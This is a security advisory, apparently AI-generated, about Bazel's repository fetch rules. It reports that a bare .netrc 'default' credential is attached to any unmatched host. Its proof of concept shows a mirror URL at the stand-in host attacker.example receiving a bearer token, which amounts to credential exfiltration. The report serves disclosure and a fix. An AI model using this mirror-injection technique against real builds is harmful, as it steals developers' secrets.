Based on my research, I found a credential-scoping analog to the "zero-address"/unchecked-sentinel bug class in Bazel's `.netrc` handling used by all HTTP-based repository fetch rules (`http_archive`, `http_file`, `http_jar`, and any custom repository rule using `ctx.download*`/`get_auth`).

### Title
Unscoped `.netrc` "default" credential entry causes secrets to be sent to attacker-controlled hosts - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`read_netrc` parses the standard `.netrc` `default` directive into the dependency-parsed dict using the empty string `""` as the machine-name key, because (per the code's own comment) `""` "can never be a valid hostname" [1](#0-0) . `use_netrc` then falls back to this `""` entry whenever the URL's host is not found among the explicit machine entries [2](#0-1) . This sentinel value behaves like the report's "zero address": instead of being rejected or scoped to a specific host, it silently matches *any* host that isn't explicitly listed, and the credentials are then attached to the outgoing request to that host [3](#0-2) .

### Finding Description
`get_auth(ctx, urls)` is the entry point used by `http_archive`/`http_file`/`http_jar` (via their `netrc`/`auth_patterns` attributes) and by custom Starlark repository rules to compute the `auth` dict passed to `ctx.download`/`ctx.download_and_extract` [4](#0-3) . If the victim's machine has a `.netrc` file with a bare `default` stanza (a common pattern for organization-wide bearer tokens or proxy credentials), that entry is stored under key `""` [1](#0-0) .

When Bazel resolves a `urls` list (e.g., mirrors declared in a `bazel_dep`'s resolved `MODULE.bazel`/registry `source.json`, or in the `urls` attribute of a `http_archive` invoked by a module extension), each URL's host is checked against the explicit `netrc` machine keys; any host not found there is treated as matching the `""` default entry [2](#0-1) . There is no host allow-listing tied to the `default` credential — it is effectively a wildcard. An attacker who controls one URL in that mirror list (for example by publishing a malicious module version to a registry, or supplying an additional/failover URL that Bazel will try) can cause the victim's `.netrc` default credential (password or bearer token) to be sent as an `Authorization` header to the attacker's server, because `use_netrc` does not scope the default entry to any particular host and treats "no explicit match" the same as "matches by default" [5](#0-4) .

### Impact Explanation
Any secret configured as a `.netrc` `default` entry (e.g., a corporate SSO/proxy bearer token intended only for the organization's registries/mirrors) is exfiltrated to any host reachable through a `urls`/mirror list that Bazel processes, including hosts introduced by third-party/registry content the local trust boundary was not meant to extend to. This is a credential-exfiltration-to-attacker-controlled-host outcome.

### Likelihood Explanation
Requires the victim to have a `default` `.netrc` entry (a documented, common configuration for corporate/CI environments using bearer-token auth, as also exercised in `oauthlife.com`/`qux.example.org`-style entries in Bazel's own tests) [6](#0-5) , and requires an attacker-influenced URL to appear somewhere in a fetched `urls` list that the victim's build resolves (e.g., a module registry entry, a fallback mirror). Both conditions are realistic in bzlmod-based builds pulling third-party modules.

### Recommendation
Do not implicitly apply the `.netrc` `default` entry to arbitrary unmatched hosts inside `use_netrc`. At minimum, require explicit opt-in (e.g., only apply `default` credentials to hosts listed in `auth_patterns`/an explicit allow-list), and surface a warning (similar to the existing password-only warning at `tools/build_defs/repo/utils.bzl:491-493`) when a `default` credential is being attached to a host that has no dedicated `.netrc` entry, so users can audit which hosts are receiving ambient credentials.

### Proof of Concept
Given a `.netrc`:
```
default
password SECRET-TOKEN
```
And a repository rule resolved with `urls = ["https://attacker.example/mirror.tar.gz"]` (e.g., supplied as an alternate mirror by a compromised/malicious Bazel registry module), `get_auth`/`use_netrc` computes `auth["https://attacker.example/mirror.tar.gz"] = {"type": "pattern", "pattern": "Bearer <password>", "password": "SECRET-TOKEN"}` because `"attacker.example"` is absent from `netrc` but `""` is present [7](#0-6) . `ctx.download` then sends `Authorization: Bearer SECRET-TOKEN` to `attacker.example`. This can be reproduced by adapting the existing `test_use_netrc` shell test in `src/test/shell/bazel/starlark_repository_test.sh` to include a `default` entry and an unmatched attacker-controlled host in the `urls` list, then asserting the computed `auth` dict contains credentials keyed to that host.

def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
    return use_netrc(netrc, urls, auth_patterns)
